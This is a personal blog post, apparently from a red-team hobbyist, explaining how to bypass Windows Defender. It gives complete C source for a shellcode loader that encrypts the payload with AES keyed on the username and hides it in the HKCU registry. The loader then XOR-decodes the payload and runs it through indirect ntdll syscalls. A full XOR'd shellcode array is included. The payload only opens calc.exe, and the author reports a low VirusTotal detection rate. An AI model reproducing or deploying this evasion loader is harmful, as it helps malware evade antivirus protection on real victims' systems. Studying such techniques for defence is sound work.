<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Bypassing Windows Defender | Stephan Bridger</title><meta name=keywords content="windows,c,programming,malware,red team"><meta name=description content="Lately I&rsquo;ve been poking around at Windows internals and writing low level code. This morning I thought I&rsquo;d try to bypass Windows Defender and get a low score on Virus Total.
One trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out."><meta name=author content="Stephan Bridger"><link rel=canonical href=https://hexagram.foo/posts/bypassing-windows-defender/><link crossorigin=anonymous href=/assets/css/stylesheet.793a8ff569756a2027f6b93c889ec37d86f8750c1c450ebac658c67d856ed6af.css integrity="sha256-eTqP9Wl1aiAn9rk8iJ7DfYb4dQwcRQ66xljGfYVu1q8=" rel="preload stylesheet" as=style><link rel=icon href=https://hexagram.foo/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hexagram.foo/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hexagram.foo/favicon-32x32.png><link rel=apple-touch-icon href=https://hexagram.foo/apple-touch-icon.png><link rel=mask-icon href=https://hexagram.foo/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hexagram.foo/posts/bypassing-windows-defender/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hexagram.foo/posts/bypassing-windows-defender/"><meta property="og:site_name" content="Stephan Bridger"><meta property="og:title" content="Bypassing Windows Defender"><meta property="og:description" content="Lately I’ve been poking around at Windows internals and writing low level code. This morning I thought I’d try to bypass Windows Defender and get a low score on Virus Total.
One trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-04-16T00:00:00+00:00"><meta property="article:modified_time" content="2025-04-16T00:00:00+00:00"><meta property="article:tag" content="Windows"><meta property="article:tag" content="C"><meta property="article:tag" content="Programming"><meta property="article:tag" content="Malware"><meta property="article:tag" content="Red Team"><meta property="og:image" content="https://hexagram.foo/fog.jpeg"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hexagram.foo/fog.jpeg"><meta name=twitter:title content="Bypassing Windows Defender"><meta name=twitter:description content="Lately I&rsquo;ve been poking around at Windows internals and writing low level code. This morning I thought I&rsquo;d try to bypass Windows Defender and get a low score on Virus Total.
One trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hexagram.foo/posts/"},{"@type":"ListItem","position":2,"name":"Bypassing Windows Defender","item":"https://hexagram.foo/posts/bypassing-windows-defender/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bypassing Windows Defender","name":"Bypassing Windows Defender","description":"Lately I\u0026rsquo;ve been poking around at Windows internals and writing low level code. This morning I thought I\u0026rsquo;d try to bypass Windows Defender and get a low score on Virus Total.\nOne trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out.\n","keywords":["windows","c","programming","malware","red team"],"articleBody":"Lately I’ve been poking around at Windows internals and writing low level code. This morning I thought I’d try to bypass Windows Defender and get a low score on Virus Total.\nOne trick I’ve been playing with is writing shellcode to the Windows registry to keep things “fileless.” It’s not super fancy, but it’s kind of neat. I combined that with indirect syscalls and some cryptographic routines to get Windows Defender to chill out.\n“Syscalls” Windows gives each user-mode application a block of virtual addresses. This is known as the user space of that application. The other large block of addresses, known as system space or kernel space, cannot be directly accessed by the application.\nTo request a service from the kernel (like reading a file or opening a process), a usermode program must make a system call using the syscall instruction. This tells the kernel which function it needs by placing a System Service Number or SSN in the eax register.\nThe SSN is basically an index in a table known as the system service descriptor table, where each number points to a different kernel function. For example:\neax = 0 -\u003e Calls the 1st function in the table eax = 1 -\u003e Calls the 2nd function eax = 2 -\u003e Calls the 3rd, and so on. The kernel finds the function using: function_address = SSDT_base + (System Service Number)\ntl;dr when a syscall instruction runs, the CPU switches from usermode to kernel mode, and the system call handler uses the system service number in eax to execute the correct function.\nUsermode functions then, in many cases, reach out to ntdll.dll, which in turn call into the kernel image, ntoskrnl.exe.\nImage from Microsoft Press Store by Pearson\nFor example, we can see this artifact here—if I write some code in userland that uses the following Win32 API functions, CreateFileA and WriteFile:\n#include #include int main() { char path[MAX_PATH]; char filename[MAX_PATH]; HANDLE hFile; DWORD bytesWritten; printf(\"Enter the path: \"); scanf(\"%s\", path); printf(\"Enter the filename: \"); scanf(\"%s\", filename); char fullPath[MAX_PATH]; snprintf(fullPath, sizeof(fullPath), \"%s\\\\%s\", path, filename); hFile = CreateFileA(fullPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL); if (hFile == INVALID_HANDLE_VALUE) { DWORD error = GetLastError(); LPVOID errorMsg; FormatMessageA( FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, (LPSTR)\u0026errorMsg, 0, NULL ); printf(\"Failed to create the file: %s\\n\", (char*)errorMsg); LocalFree(errorMsg); return 1; } const char* content = \"Noted\"; if (!WriteFile(hFile, content, strlen(content), \u0026bytesWritten, NULL)) { printf(\"Failed to write to the file.\\n\"); CloseHandle(hFile); return 1; } CloseHandle(hFile); printf(\"File created successfully: %s\\n\", fullPath); return 0; } This code uses the userland hooks CreateFileA and WriteFile. But if we compile this code and step through it in a debugger or decompiler, we’ll see something else: under the hood, these functions invoke NtCreateFile and NtWriteFile—Native API stubs in ntdll.dll that set up registers and issue the actual syscall.\nCreateFileA is a high-level wrapper over the Native API. It handles things like ANSI/unicode conversion, then delegates to NtCreateFile, which prepares the registers and triggers the syscall within ntoskrnl.exe.\nNt or Zw are system calls declared in ntdll.dll and ntoskrnl.exe. When called from ntdll.dll in user mode, these groups are almost exactly the same; they trap into kernel mode and call the equivalent function in ntoskrnl.exe via the SSDT. When calling the functions directly in ntoskrnl.exe (only possible in kernel mode), the Zw variants ensure kernel mode, whereas the Nt variants do not.\nSo, native calls reach out to the System Service Descriptor Table (SSDT), which holds an array of offsets to kernel system calls:\ntypedef struct tagSERVICE_DESCRIPTOR_TABLE { SYSTEM_SERVICE_TABLE nt; //effectively a pointer to Service Dispatch Table (SSDT) itself SYSTEM_SERVICE_TABLE win32k; SYSTEM_SERVICE_TABLE sst3; //pointer to a memory address that contains how many routines are defined in the table SYSTEM_SERVICE_TABLE sst4; } SERVICE_DESCRIPTOR_TABLE; So, calls to functions in ntdll.dll in turn get converted to low-level calls like ZwCreateFile and ZwWriteFile, courtesy of the index we pass to ntdll.dll and the syscall.\n//snipped mov r10,rcx | NtWriteFile mov eax,8 | test byte ptr ds:[7FFE0308],1 | jne ntdll.7FFF055AEE55 | syscall | ret In this blog post, we’ll use indirect syscalls which leverage native functions within ntdll.dll, avoiding certain calls to the Win32 API.\nSince ntdll.dll is available to every Windows process and provides the interface for user-mode programs to interact with kernel services, using system calls through ntdll.dll can help activity appear more legitimate.\nIf we bypassed ntdll.dll and directly called kernel functions, it could stick out, increasing the likelihood of being detected by security tools that monitor abnormal behavior.\nIn a future blog post, we’ll cover additional changes to our setup, including alternative approaches to enhancing stealth, such as unhooking.\nTypeDefs, For You and Me By default, Windows Defender and various telemetry heavily monitor most of the things that happen in userland. This is to say that using userland hooks to do anything interesting can make it stick out—in a bad way.\nTo improve our chances of flying under the radar, we can use some alternative userland functions and instead make calls using Native API functionality within ntdll.dll, which in turn make syscalls to the kernel.\nBut to do this, we’ll need some initial declarations. These are the type definitions we’ll use for Native API functions. We start with the _PS_ATTRIBUTE for process and thread creation1, along with unicode handling, process attributes, and identification for processes and threads.\nWe also define the types we’ll need for indirect calls to allocate memory2 and spin up new process threads3, which we’ll do using pNtAllocateVirtualMemory, pNtCreateThreadEx, and pNtWaitForSingleObject, respectively.\n#include #include #include #include #include #pragma comment(lib, \"bcrypt.lib\") typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID; // Define prototypes with proper calling convention typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection ); typedef NTSTATUS(NTAPI* pNtCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList ); typedef NTSTATUS(NTAPI* pNtWaitForSingleObject)( HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout ); typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType ); typedef NTSTATUS(NTAPI* pNtClose)( HANDLE Handle ); // Function to get NTDLL function address PVOID GetNtdllFunction(LPCSTR FunctionName) { HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\"); if (!hNtdll) { return NULL; } return GetProcAddress(hNtdll, FunctionName); } To reiterate the point here: all of this is to avoid calling userland hooks that are more heavily monitored by telemetry products like Windows Defender. For example, the userland function CreateRemoteThread might stick out. That is, instead of calling the userland hook, we call pNtCreateThreadEx.\nfoo() Now that we have type definitions to use with some of our ntdll.dll calls later on, next we need shellcode and functions for encryption and execution. The shellcode is just a simple payload that launches calc.exe.\nSide note: I’ve already XOR’d the payload before embedding it in the program. We’ll reverse the XOR just before execution.\nSo, beyond our shellcode, we’ll use the following constructions: an AES encryption routine, an AES decryption routine, a reverse XOR routine, functions to read from and write to the Windows registry, and indirect system calls for allocating read-write-execute memory and spinning up new process threads.\nBut first, our AES routines. We generate our encryption key using the username of the current user. If the username is less than 16 characters, we just pad it with 0x01. We then follow the conventions for using the BCrypt API from Microsoft4.\nconst BYTE shellcode[] = { 0xb7, 0x03, 0xc8, 0xaf, 0xbb, 0xa3, 0x8b, 0x4b, 0x4b, 0x4b, 0x0a, 0x1a, 0x0a, 0x1b, 0x19, 0x1a, 0x1d, 0x03, 0x7a, 0x99, 0x2e, 0x03, 0xc0, 0x19, 0x2b, 0x03, 0xc0, 0x19, 0x53, 0x03, 0xc0, 0x19, 0x6b, 0x03, 0xc0, 0x39, 0x1b, 0x03, 0x44, 0xfc, 0x01, 0x01, 0x06, 0x7a, 0x82, 0x03, 0x7a, 0x8b, 0xe7, 0x77, 0x2a, 0x37, 0x49, 0x67, 0x6b, 0x0a, 0x8a, 0x82, 0x46, 0x0a, 0x4a, 0x8a, 0xa9, 0xa6, 0x19, 0x0a, 0x1a, 0x03, 0xc0, 0x19, 0x6b, 0xc0, 0x09, 0x77, 0x03, 0x4a, 0x9b, 0xc0, 0xcb, 0xc3, 0x4b, 0x4b, 0x4b, 0x03, 0xce, 0x8b, 0x3f, 0x2c, 0x03, 0x4a, 0x9b, 0x1b, 0xc0, 0x03, 0x53, 0x0f, 0xc0, 0x0b, 0x6b, 0x02, 0x4a, 0x9b, 0xa8, 0x1d, 0x03, 0xb4, 0x82, 0x0a, 0xc0, 0x7f, 0xc3, 0x03, 0x4a, 0x9d, 0x06, 0x7a, 0x82, 0x03, 0x7a, 0x8b, 0xe7, 0x0a, 0x8a, 0x82, 0x46, 0x0a, 0x4a, 0x8a, 0x73, 0xab, 0x3e, 0xba, 0x07, 0x48, 0x07, 0x6f, 0x43, 0x0e, 0x72, 0x9a, 0x3e, 0x93, 0x13, 0x0f, 0xc0, 0x0b, 0x6f, 0x02, 0x4a, 0x9b, 0x2d, 0x0a, 0xc0, 0x47, 0x03, 0x0f, 0xc0, 0x0b, 0x57, 0x02, 0x4a, 0x9b, 0x0a, 0xc0, 0x4f, 0xc3, 0x03, 0x4a, 0x9b, 0x0a, 0x13, 0x0a, 0x13, 0x15, 0x12, 0x11, 0x0a, 0x13, 0x0a, 0x12, 0x0a, 0x11, 0x03, 0xc8, 0xa7, 0x6b, 0x0a, 0x19, 0xb4, 0xab, 0x13, 0x0a, 0x12, 0x11, 0x03, 0xc0, 0x59, 0xa2, 0x1c, 0xb4, 0xb4, 0xb4, 0x16, 0x03, 0xf1, 0x4a, 0x4b, 0x4b, 0x4b, 0x4b, 0x4b, 0x4b, 0x4b, 0x03, 0xc6, 0xc6, 0x4a, 0x4a, 0x4b, 0x4b, 0x0a, 0xf1, 0x7a, 0xc0, 0x24, 0xcc, 0xb4, 0x9e, 0xf0, 0xbb, 0xfe, 0xe9, 0x1d, 0x0a, 0xf1, 0xed, 0xde, 0xf6, 0xd6, 0xb4, 0x9e, 0x03, 0xc8, 0x8f, 0x63, 0x77, 0x4d, 0x37, 0x41, 0xcb, 0xb0, 0xab, 0x3e, 0x4e, 0xf0, 0x0c, 0x58, 0x39, 0x24, 0x21, 0x4b, 0x12, 0x0a, 0xc2, 0x91, 0xb4, 0x9e, 0x28, 0x2a, 0x27, 0x28, 0x65, 0x2e, 0x33, 0x2e, 0x4b }; const DWORD shellcodeSize = sizeof(shellcode); // AES Configuration #define AES_KEY_LENGTH 16 // 128-bit AES #define AES_BLOCK_SIZE 16 // Helper function to generate encryption key from user environment BOOL GenerateKeyFromEnvironment(BYTE* key, DWORD keySize) { CHAR username[UNLEN + 1]; DWORD usernameLen = UNLEN + 1; if (!GetUserNameA(username, \u0026usernameLen)) { printf(\"Failed to get username: %d\\n\", GetLastError()); return FALSE; } BYTE padding = 0x01; for (DWORD i = 0; i \u003c keySize; i++) { if (i \u003c usernameLen) { key[i] = (BYTE)username[i]; } else { key[i] = padding++; } } return TRUE; } // AES Encryption Function BOOL AESEncrypt(const BYTE* plaintext, DWORD plaintextSize, const BYTE* key, BYTE** ciphertext, DWORD* ciphertextSize) { BCRYPT_ALG_HANDLE hAlgorithm = NULL; BCRYPT_KEY_HANDLE hKey = NULL; NTSTATUS status; // Open AES provider status = BCryptOpenAlgorithmProvider(\u0026hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0); if (status != 0) { printf(\"BCryptOpenAlgorithmProvider failed: 0x%x\\n\", status); return FALSE; } // Set ECB mode status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptSetProperty failed: 0x%x\\n\", status); return FALSE; } // Create key handle status = BCryptGenerateSymmetricKey(hAlgorithm, \u0026hKey, NULL, 0, (BYTE*)key, AES_KEY_LENGTH, 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptGenerateSymmetricKey failed: 0x%x\\n\", status); return FALSE; } // Get output buffer size DWORD cbCiphertext = 0; status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL, NULL, 0, NULL, 0, \u0026cbCiphertext, BCRYPT_BLOCK_PADDING); if (status != 0) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptEncrypt size check failed: 0x%x\\n\", status); return FALSE; } // Allocate ciphertext buffer *ciphertext = (BYTE*)malloc(cbCiphertext); if (!*ciphertext) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"Memory allocation failed\\n\"); return FALSE; } // Perform encryption status = BCryptEncrypt(hKey, (BYTE*)plaintext, plaintextSize, NULL, NULL, 0, *ciphertext, cbCiphertext, ciphertextSize, BCRYPT_BLOCK_PADDING); if (status != 0) { free(*ciphertext); BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptEncrypt failed: 0x%x\\n\", status); return FALSE; } // Cleanup BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); return TRUE; } If all goes well, we succeed in deriving a key and encrypting the shellcode. But we also need an AES decryption routine. The use of AES routines to keep our payload safe further reduces the likelihood of Windows Defender catching us.\n// AES Decryption Function BOOL AESDecrypt(const BYTE* ciphertext, DWORD ciphertextSize, const BYTE* key, BYTE** plaintext, DWORD* plaintextSize) { BCRYPT_ALG_HANDLE hAlgorithm = NULL; BCRYPT_KEY_HANDLE hKey = NULL; NTSTATUS status; // Open AES provider status = BCryptOpenAlgorithmProvider(\u0026hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0); if (status != 0) { printf(\"BCryptOpenAlgorithmProvider failed: 0x%x\\n\", status); return FALSE; } // Set ECB mode status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_ECB, sizeof(BCRYPT_CHAIN_MODE_ECB), 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptSetProperty failed: 0x%x\\n\", status); return FALSE; } // Create key handle status = BCryptGenerateSymmetricKey(hAlgorithm, \u0026hKey, NULL, 0, (BYTE*)key, AES_KEY_LENGTH, 0); if (status != 0) { BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptGenerateSymmetricKey failed: 0x%x\\n\", status); return FALSE; } // Get output buffer size DWORD cbPlaintext = 0; status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL, NULL, 0, NULL, 0, \u0026cbPlaintext, BCRYPT_BLOCK_PADDING); if (status != 0) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptDecrypt size check failed: 0x%x\\n\", status); return FALSE; } // Allocate plaintext buffer *plaintext = (BYTE*)malloc(cbPlaintext); if (!*plaintext) { BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"Memory allocation failed\\n\"); return FALSE; } // Perform decryption status = BCryptDecrypt(hKey, (BYTE*)ciphertext, ciphertextSize, NULL, NULL, 0, *plaintext, cbPlaintext, plaintextSize, BCRYPT_BLOCK_PADDING); if (status != 0) { free(*plaintext); BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); printf(\"BCryptDecrypt failed: 0x%x\\n\", status); return FALSE; } // Cleanup BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlgorithm, 0); return TRUE; } However, even after this, we’ll make one final effort to subvert Windows Defender—namely, by writing our encrypted payload to the Windows registry, so as to remain stealthy, fileless, and potentially persistent.\nIn other words: we’re never writing to disk. Our shellcode lives only in memory, getting decrypted and XOR-decoded on the fly before execution.\nBut how can we perform reads and writes against the Windows registry? We’ll need to use the winreg API from Microsoft.5\nFirst we’ll make use of RegOpenKeyExA and RegSetValueExA since we want to write to the Window’s registry. But we need somewhere to write! And we want to write to Control Panel, under the current running user’s username.\nSo, before we read or write, we’ll get the username from the current environment and append it to the write operation under the HKEY Control Panel – this way when we do write out, it will be within the registry key \\Control Panel\\Username under HKEY_CURRENT_USER.\nAnd afterward, we use RegQueryValueExA to do the opposite operation, querying and reading the registry key we’ve written.\nBOOL writeRegistry(const BYTE* data, DWORD dataSize, const char* valueName) { HKEY hKey; LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, \"Control Panel\", 0, KEY_SET_VALUE, \u0026hKey); if (status != ERROR_SUCCESS) { printf(\"Error opening key: %d\\n\", GetLastError()); return FALSE; } status = RegSetValueExA(hKey, valueName, 0, REG_BINARY, data, dataSize); RegCloseKey(hKey); if (status != ERROR_SUCCESS) { printf(\"Error writing value: %d\\n\", GetLastError()); return FALSE; } return TRUE; } BOOL readRegistry(BYTE** buffer, DWORD* bytesRead, const char* valueName) { HKEY hKey; LONG status = RegOpenKeyExA(HKEY_CURRENT_USER, \"Control Panel\", 0, KEY_READ, \u0026hKey); if (status != ERROR_SUCCESS) { printf(\"Error opening key: %d\\n\", GetLastError()); return FALSE; } DWORD type, size = 0; status = RegQueryValueExA(hKey, valueName, NULL, \u0026type, NULL, \u0026size); if (status != ERROR_SUCCESS) { RegCloseKey(hKey); printf(\"Error querying value size: %d\\n\", GetLastError()); return FALSE; } *buffer = (BYTE*)malloc(size); if (!*buffer) { RegCloseKey(hKey); printf(\"Memory allocation failed\\n\"); return FALSE; } status = RegQueryValueExA(hKey, valueName, NULL, \u0026type, *buffer, \u0026size); RegCloseKey(hKey); if (status != ERROR_SUCCESS) { free(*buffer); printf(\"Error reading value: %d\\n\", GetLastError()); return FALSE; } *bytesRead = size; return TRUE; } Before we wrap things up with our shellcode execution and main functions, we need a small gadget to decode the payload, since the payload in this script was one I XOR’d beforehand.\nvoid XORDecode(BYTE* data, DWORD dataSize, BYTE key) { for (DWORD i = 0; i \u003c dataSize; i++) { data[i] ^= key; } } Alright, now we’re close. We need to make use of the type definitions for indirect syscalls we created earlier.\nWe get the function pointers to allocate and protect virtual memory, as well as to spin a new thread and wait for it to launch. And our epilogue will use the NtFreeVirtualMemory function to free our objects when we’re done.\nSo, fundamentally what we’re doing is dropping our now decrypted and XOR decoded shellcode into read-write-execute memory via ntdll calls for evasion. Lastly, our process spins up as a new thread in our current process–then we wait for it to finish.\nAnd the resulting shellcode that’s launched starts calc.exe, effectively forking off from our current process. After this, we clean up our memory and bail out cleanly.\nvoid ExecuteShellcode(BYTE* shellcode, SIZE_T size) { XORDecode(shellcode, size, 'K'); // Get function pointers pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetNtdllFunction(\"NtAllocateVirtualMemory\"); pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetNtdllFunction(\"NtProtectVirtualMemory\"); pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetNtdllFunction(\"NtCreateThreadEx\"); pNtWaitForSingleObject NtWaitForSingleObject = (pNtWaitForSingleObject)GetNtdllFunction(\"NtWaitForSingleObject\"); pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetNtdllFunction(\"NtFreeVirtualMemory\"); pNtClose NtClose = (pNtClose)GetNtdllFunction(\"NtClose\"); if (!NtAllocateVirtualMemory || !NtProtectVirtualMemory || !NtCreateThreadEx || !NtWaitForSingleObject || !NtFreeVirtualMemory || !NtClose) { printf(\"Failed to get NTDLL function pointers\\n\"); return; } PVOID execMemory = NULL; SIZE_T regionSize = size; ULONG oldProtect; // Allocate memory NTSTATUS status = NtAllocateVirtualMemory( GetCurrentProcess(), \u0026execMemory, 0, \u0026regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ); if (status != 0) { printf(\"NtAllocateVirtualMemory failed: 0x%x\\n\", status); return; } // Copy shellcode memcpy(execMemory, shellcode, size); // Change protection status = NtProtectVirtualMemory( GetCurrentProcess(), \u0026execMemory, \u0026size, PAGE_EXECUTE_READ, \u0026oldProtect ); if (status != 0) { printf(\"NtProtectVirtualMemory failed: 0x%x\\n\", status); NtFreeVirtualMemory(GetCurrentProcess(), \u0026execMemory, \u0026size, MEM_RELEASE); return; } // Create thread HANDLE hThread = NULL; status = NtCreateThreadEx( \u0026hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, 0, 0, 0, NULL ); if (status != 0) { printf(\"NtCreateThreadEx failed: 0x%x\\n\", status); NtFreeVirtualMemory(GetCurrentProcess(), \u0026execMemory, \u0026size, MEM_RELEASE); return; } // Wait for thread status = NtWaitForSingleObject(hThread, FALSE, NULL); if (status != 0) { printf(\"NtWaitForSingleObject failed: 0x%x\\n\", status); } // Cleanup NtClose(hThread); NtFreeVirtualMemory(GetCurrentProcess(), \u0026execMemory, \u0026size, MEM_RELEASE); } So, to recap and tie all of it together.\nWe use the current username the process is running under as a cryptographic key for our AES routines to encrypt our shellcode and write this out to the Windows registry. Then we read it back out, performing decryption before calling the function to actually execute the shellcode. Finally, in ExecuteShellcode we reverse the XOR encoding just before copying the shellcode to executable memory and attempting to execute it. We spin up a new thread and wait with NtWaitForSingleObject – if all goes well, we get a fresh calc.exe and Windows Defender doesn’t yell at us! int main() { BYTE key[AES_KEY_LENGTH]; if (!GenerateKeyFromEnvironment(key, AES_KEY_LENGTH)) { return 1; } // Encrypt payload BYTE* encryptedShellcode = NULL; DWORD encryptedSize = 0; if (!AESEncrypt(shellcode, shellcodeSize, key, \u0026encryptedShellcode, \u0026encryptedSize)) { return 1; } // Write to registry if (!writeRegistry(encryptedShellcode, encryptedSize)) { free(encryptedShellcode); return 1; } free(encryptedShellcode); printf(\"Successfully wrote encrypted payload to registry\\n\"); // Read from registry BYTE* readBuffer = NULL; DWORD bytesRead; if (!readRegistry(\u0026readBuffer, \u0026bytesRead)) { return 1; } // Decrypt payload BYTE* decryptedShellcode = NULL; DWORD decryptedSize; if (!AESDecrypt(readBuffer, bytesRead, key, \u0026decryptedShellcode, \u0026decryptedSize)) { free(readBuffer); return 1; } free(readBuffer); // Verify decrypted size matches original if (decryptedSize != shellcodeSize) { printf(\"Decrypted size mismatch! Expected %d, got %d\\n\", shellcodeSize, decryptedSize); free(decryptedShellcode); return 1; } // Execute the shellcode printf(\"Executing decrypted payload...\\n\"); ExecuteShellcode(decryptedShellcode, decryptedSize); free(decryptedShellcode); return 0; } Profit? Alright, let’s check the scoreboard. Are we able to successfully read and write to the registry and execute shellcode without Windows Defender complaining?\nLooks good. Let’s see how many antivirus vendors detect our code. Ahh, only ten out of 72! That’s not bad. But we could also do better!\nNext post!\nProof of concept: RegistryGhost\nhttps://processhacker.sourceforge.io/doc/ntpsapi_8h_source.html ↩︎\nhttps://stackoverflow.com/a/26414236 ↩︎\nhttps://ntdoc.m417z.com/ntcreatethreadex ↩︎\nhttps://learn.microsoft.com/en-us/windows/win32/api/bcrypt/ ↩︎\nhttps://learn.microsoft.com/en-us/windows/win32/api/winreg/ ↩︎\n","wordCount":"3123","inLanguage":"en","image":"https://hexagram.foo/fog.jpeg","datePublished":"2025-04-16T00:00:00Z","dateModified":"2025-04-16T00:00:00Z","author":{"@type":"Person","name":"Stephan Bridger"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hexagram.foo/posts/bypassing-windows-defender/"},"publisher":{"@type":"Organization","name":"Stephan Bridger","logo":{"@type":"ImageObject","url":"https://hexagram.foo/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hexagram.foo/ accesskey=h title="Stephan Bridger (Alt + H)">Stephan Bridger</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
